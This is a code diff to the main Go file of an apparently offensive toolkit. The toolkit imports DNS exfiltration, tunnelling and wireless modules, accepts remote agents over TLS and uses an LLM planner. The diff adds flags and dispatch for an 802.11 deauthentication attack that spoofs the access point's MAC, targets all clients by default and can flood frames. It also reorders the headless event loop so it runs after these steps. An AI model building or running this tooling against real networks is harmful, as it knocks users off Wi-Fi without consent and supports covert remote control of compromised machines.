@@ -31,6 +31,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/dnsexfil"
 	"github.com/sk666G/red-sky---arsenal/internal/tunnel"
 	"github.com/sk666G/red-sky---arsenal/internal/tui"
+	"github.com/sk666G/red-sky---arsenal/internal/wireless"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
 )
 
@@ -57,6 +58,12 @@ func main() {
 	wlChannel := flag.Int("wireless-channel", 0, "set the wifi channel before capture (0 = leave as is)")
 	wlOut := flag.String("wireless-out", "", "path to write the capture to (.pcap)")
 	wlDuration := flag.Duration("wireless-duration", 30*time.Second, "how long to capture")
+	deauthBSSID := flag.String("deauth-bssid", "", "802.11 deauth: target AP MAC (spoofed as source)")
+	deauthClient := flag.String("deauth-client", "ff:ff:ff:ff:ff:ff", "802.11 deauth: target client MAC (broadcast default)")
+	deauthReason := flag.Int("deauth-reason", 7, "802.11 deauth: reason code")
+	deauthBurst := flag.Int("deauth-burst", 3, "802.11 deauth: frames per interval")
+	deauthInterval := flag.Duration("deauth-interval", 0, "802.11 deauth: delay between bursts (0 = flood)")
+	deauthDuration := flag.Duration("deauth-duration", 10*time.Second, "802.11 deauth: total run time")
 	flag.Parse()
 
 	if *pluginFlag != "" {
@@ -99,13 +106,6 @@ func main() {
 
 	go acceptLoop(tlsLn, mgr)
 
-	if *headless {
-		for ev := range mgr.Events {
-			fmt.Printf("[%s] %s: %s\n", ev.Kind, ev.AgentID, ev.Text)
-		}
-		return
-	}
-
 	if *socksBind != "" {
 		go startSocks(*socksBind, mgr)
 	}
@@ -115,6 +115,28 @@ func main() {
 			log.Fatalf("-wireless requires -wireless-out")
 		}
 		go runWirelessCapture(mgr, *wlIface, *wlChannel, *wlOut, *wlDuration)
+	}
+
+	// deauth-bssid dispatch — fires when -deauth-bssid is set
+	if *deauthBSSID != "" {
+		if *wlIface == "" {
+			log.Printf("[deauth] -wireless <iface> required")
+		} else {
+			dctx, dcancel := context.WithTimeout(context.Background(), *deauthDuration)
+			derr := wireless.Deauth(dctx, wireless.DeauthOptions{
+				Iface:    *wlIface,
+				BSSID:    *deauthBSSID,
+				Client:   *deauthClient,
+				Reason:   uint16(*deauthReason),
+				Burst:    *deauthBurst,
+				Interval: *deauthInterval,
+				Duration: *deauthDuration,
+			})
+			dcancel()
+			if derr != nil {
+				log.Printf("[deauth] %v", derr)
+			}
+		}
 	}
 
 	if *dnsBind != "" {
@@ -132,6 +154,13 @@ func main() {
 			log.Fatalf("-pcap requires -pcap-out")
 		}
 		go runPCAPCapture(mgr, *pcapIface, *pcapOut, *pcapDuration)
+	}
+
+	if *headless {
+		for ev := range mgr.Events {
+			fmt.Printf("[%s] %s: %s\n", ev.Kind, ev.AgentID, ev.Text)
+		}
+		return
 	}
 
 	pl := planner.NewOllama("", *llmModel)
